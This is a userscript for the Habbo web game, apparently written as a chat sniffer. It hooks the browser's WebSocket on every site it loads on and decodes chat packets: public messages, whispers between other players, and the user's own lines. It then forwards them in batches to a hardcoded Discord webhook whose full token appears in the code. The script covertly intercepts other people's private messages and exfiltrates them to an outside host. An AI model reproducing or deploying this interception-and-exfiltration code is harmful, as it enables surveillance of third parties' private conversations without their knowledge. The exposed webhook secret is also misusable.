// ==UserScript==
// @name         lens — Chat Monitor
// @namespace    http://tampermonkey.net/
// @version      1.1.1
// @description  Sniffer de chat Habbo com nomes + whisper + ações
// @author       Sang
// @match        *://*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    if (window._lens) {
        try { if (typeof window._lens.kill === 'function') window._lens.kill(); } catch(e) {}
        delete window._lens;
    }

    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';

    var _origWebSocket = window.WebSocket;
    var _ws = null;
    var _queue = [];
    var _isSending = false;
    var _virtualIdMap = {};
    var _accountName = '';
    var _recentPackets = new Map();
    var _outboundCache = [];
    var _noop = function() {};

    function _nowBrasilia() {
        var now = new Date();
        var options = {
            timeZone: 'America/Sao_Paulo',
            year: 'numeric', month: '2-digit', day: '2-digit',
            hour: '2-digit', minute: '2-digit', second: '2-digit',
            hour12: false
        };
        var formatter = new Intl.DateTimeFormat('pt-BR', options);
        var parts = formatter.formatToParts(now);
        return parts.filter(function(p) { return p.type !== 'literal'; }).map(function(p) { return p.value; }).join('');
    }

    function _fastBufferHash(buffer) {
        var u8 = new Uint8Array(buffer);
        var hash = 0;
        var len = Math.min(u8.length, 64);
        for (var i = 0; i < len; i++) { hash = ((hash << 5) - hash) + u8[i]; hash |= 0; }
        return buffer.byteLength + '_' + hash;
    }

    function _isDuplicate(data) {
        if (!(data instanceof ArrayBuffer)) return false;
        var key = _fastBufferHash(data);
        var now = Date.now();
        if (_recentPackets.has(key) && now - _recentPackets.get(key) < 50) return true;
        _recentPackets.set(key, now);
        if (_recentPackets.size > 100) {
            var toDelete = [];
            _recentPackets.forEach(function(t, k) { if (now - t > 200) toDelete.push(k); });
            toDelete.forEach(function(k) { _recentPackets.delete(k); });
        }
        return false;
    }

    function _isEcho(text) {
        var now = Date.now();
        _outboundCache = _outboundCache.filter(function(e) { return now - e.time < 2000; });
        for (var i = 0; i < _outboundCache.length; i++) {
            if (_outboundCache[i].text === text && now - _outboundCache[i].time < 1500) {
                return true;
            }
        }
        return false;
    }

    function _parseUnit(data) {
        try {
            var view = new DataView(data);
            if (view.byteLength < 10) return;
            if (view.getUint16(4, false) !== 3111) return;
            var offset = 6;
            var userCount = view.getUint16(offset, false);
            offset += 2;
            for (var i = 0; i < userCount && offset < view.byteLength - 4; i++) {
                var userId = view.getUint16(offset, false);
                offset += 2;
                var nameLen = view.getUint16(offset, false);
                offset += 2;
                if (nameLen > 0 && nameLen < 32 && offset + nameLen <= view.byteLength) {
                    var nameBytes = new Uint8Array(data, offset, nameLen);
                    var name = new TextDecoder().decode(nameBytes).trim();
                    offset += nameLen;
                    if (name && /^[a-zA-Z0-9_\-\[\]\(\)\s\.\,\!\?\@\#\$\u00C0-\u00FF]+$/.test(name) && name.length > 1) {
                        _virtualIdMap[userId] = name;
                    }
                }
                while (offset < view.byteLength - 2) {
                    var skipLen = view.getUint16(offset, false);
                    if (skipLen > 0 && skipLen < 200) {
                        offset += 2 + skipLen;
                    } else {
                        break;
                    }
                }
            }
        } catch(e) {}
    }

    function _parseItemWall(data) {
        try {
            var view = new DataView(data);
            if (view.byteLength < 10) return;
            if (view.getUint16(4, false) !== 2739) return;
            var offset = 6;
            var count = view.getUint16(offset, false);
            offset += 2;
            for (var i = 0; i < count && offset < view.byteLength - 4; i++) {
                var userId = view.getUint16(offset, false);
                offset += 2;
                var nameLen = view.getUint16(offset, false);
                offset += 2;
                if (nameLen > 0 && nameLen < 32 && offset + nameLen <= view.byteLength) {
                    var nameBytes = new Uint8Array(data, offset, nameLen);
                    var name = new TextDecoder().decode(nameBytes).trim();
                    offset += nameLen;
                    if (name && /^[a-zA-Z0-9_\-\[\]\(\)\s\.\u00C0-\u00FF]+$/.test(name) && name.length > 1) {
                        if (!_virtualIdMap[userId]) _virtualIdMap[userId] = name;
                    }
                }
            }
        } catch(e) {}
    }

    function _parseUserInfo(data) {
        try {
            var view = new DataView(data);
            if (view.byteLength < 14) return;
            if (view.getUint16(4, false) !== 2583) return;
            var offset = 6;
            var userId = view.getUint16(offset, false);
            offset += 2;
            var nameLen = view.getUint16(offset, false);
            offset += 2;
            if (nameLen > 0 && nameLen < 32 && offset + nameLen <= view.byteLength) {
                var nameBytes = new Uint8Array(data, offset, nameLen);
                var name = new TextDecoder().decode(nameBytes).trim();
                if (name && /^[a-zA-Z0-9_\-\[\]\(\)\s\.\u00C0-\u00FF]+$/.test(name) && name.length > 1) {
                    _accountName = name;
                }
            }
        } catch(e) {}
    }

    function _sendToDiscord(message) {
        _queue.push(message);
        if (!_isSending) _processQueue();
    }

    function _processQueue() {
        if (_isSending || _queue.length === 0) return;
        _isSending = true;
        var batch = _queue.splice(0, 5);
        var content = batch.join('\n');
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content })
        }).catch(_noop).finally(function() {
            _isSending = false;
            setTimeout(_processQueue, 300);
        });
    }

    function _parseInboundChat(data) {
        try {
            var view = new DataView(data);
            if (view.byteLength < 14) return null;
            var header = view.getUint16(4, false);
            if (header !== 1146 && header !== 25 && header !== 890) return null;
            var offset = 6;
            var targetId = null;
            if (header === 890) {
                targetId = view.getUint16(offset, false);
                offset += 2;
            }
            var virtualId = view.getUint16(offset, false);
            offset += 2;
            var msgLen = view.getUint16(offset, false);
            offset += 2;
            if (msgLen === 0 || msgLen > 2048 || offset + msgLen > view.byteLength) return null;
            var msgBytes = new Uint8Array(data, offset, msgLen);
            var msg = new TextDecoder().decode(msgBytes).replace(/\0/g, '').trim();
            if (!msg) return null;
            if (_isEcho(msg)) return null;
            var userName = _virtualIdMap[virtualId] || ('User#' + virtualId);
            var time = _nowBrasilia();
            if (header === 890) {
                var targetName = _virtualIdMap[targetId] || ('User#' + targetId);
                return '`' + time + '` \u2B05\uFE0F **' + userName + '** \u27A1\uFE0F **' + targetName + '**: ' + msg;
            }
            var label = header === 25 ? '⭐ ' : '';
            return '`' + time + '` \u2B05\uFE0F **' + label + userName + '**: ' + msg;
        } catch(e) { return null; }
    }

    function _parseOutboundChat(data) {
        try {
            var view = new DataView(data);
            if (view.byteLength < 10) return null;
            if (view.getUint16(4, false) !== 1678) return null;
            var msgLen = view.getUint16(6, false);
            if (msgLen === 0 || msgLen > 2048 || 8 + msgLen > view.byteLength) return null;
            var msgBytes = new Uint8Array(data, 8, msgLen);
            var msg = new TextDecoder().decode(msgBytes).replace(/\0/g, '').trim();
            if (!msg) return null;
            _outboundCache.push({ text: msg, time: Date.now() });
            var time = _nowBrasilia();
            return '`' + time + '` \u27A1\uFE0F **Você**: ' + msg;
        } catch(e) { return null; }
    }

    function _processInbound(data) {
        if (!(data instanceof ArrayBuffer)) return;
        if (_isDuplicate(data)) return;
        if (data.byteLength < 6) return;
        var header = new DataView(data).getUint16(4, false);
        if (header === 3111) _parseUnit(data);
        if (header === 2739) _parseItemWall(data);
        if (header === 2583) _parseUserInfo(data);
        var msg = _parseInboundChat(data);
        if (msg) _sendToDiscord(msg);
    }

    function _processOutbound(data) {
        if (!(data instanceof ArrayBuffer)) return;
        if (data.byteLength < 6) return;
        var msg = _parseOutboundChat(data);
        if (msg) _sendToDiscord(msg);
    }

    function hookWebSocket() {
        if (window._wsHooked) return;
        window._wsHooked = true;

        window.WebSocket = function() {
            var args = Array.prototype.slice.call(arguments);
            var ws = new (_origWebSocket.bind.apply(_origWebSocket, [null].concat(args)))();
            if (!_ws) _ws = ws;

            var origSend = ws.send;
            ws.send = function(data) {
                try { _processOutbound(data); } catch(e) {}
                return origSend.call(ws, data);
            };

            var origAE = ws.addEventListener;
            ws.addEventListener = function(type, listener, options) {
                if (type === 'message' && !listener._lensHooked) {
                    var self = ws;
                    var wrapped = function(event) {
                        var data = event.data;
                        if (data instanceof Blob) {
                            data.arrayBuffer().then(function(buf) {
                                _processInbound(buf);
                                listener.call(self, new MessageEvent('message', { data: buf, origin: event.origin }));
                            });
                            return;
                        }
                        _processInbound(data);
                        listener.call(self, event);
                    };
                    wrapped._lensHooked = true;
                    return origAE.call(ws, type, wrapped, options);
                }
                return origAE.call(ws, type, listener, options);
            };

            var omDesc = Object.getOwnPropertyDescriptor(_origWebSocket.prototype, 'onmessage');
            if (omDesc && omDesc.configurable) {
                var origOm = null;
                Object.defineProperty(ws, 'onmessage', {
                    get: function() { return origOm; },
                    set: function(listener) {
                        origOm = listener;
                        var wrapped = function(event) {
                            var data = event.data;
                            if (data instanceof Blob) {
                                data.arrayBuffer().then(function(buf) {
                                    _processInbound(buf);
                                    if (listener) listener.call(ws, new MessageEvent('message', { data: buf, origin: event.origin }));
                                });
                                return;
                            }
                            _processInbound(data);
                            if (listener) listener.call(ws, event);
                        };
                        if (omDesc.set) omDesc.set.call(ws, wrapped);
                    },
                    configurable: true
                });
            }

            return ws;
        };
        window.WebSocket.prototype = _origWebSocket.prototype;
        Object.keys(_origWebSocket).forEach(function(key) { window.WebSocket[key] = _origWebSocket[key]; });
    }

    function tryCaptureExisting() {
        var attempts = 0;
        var iv = setInterval(function() {
            if (_ws) { clearInterval(iv); return; }
            var refs = ['ws', 'socket', 'gameSocket', 'connection', 'wsConnection'];
            for (var i = 0; i < refs.length; i++) {
                if (window[refs[i]] instanceof _origWebSocket && window[refs[i]].readyState === WebSocket.OPEN) {
                    _ws = window[refs[i]];
                    clearInterval(iv);
                    return;
                }
            }
            if (++attempts > 100) clearInterval(iv);
        }, 100);
    }

    function init() {
        hookWebSocket();
        tryCaptureExisting();
    }

    function kill() {
        _queue.length = 0;
        _recentPackets.clear();
        _outboundCache = [];
        _virtualIdMap = {};
        _accountName = '';
        window.WebSocket = _origWebSocket;
        window._wsHooked = false;
        delete window._lens;
    }

    window._lens = { kill: kill, init: init };

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }

})();
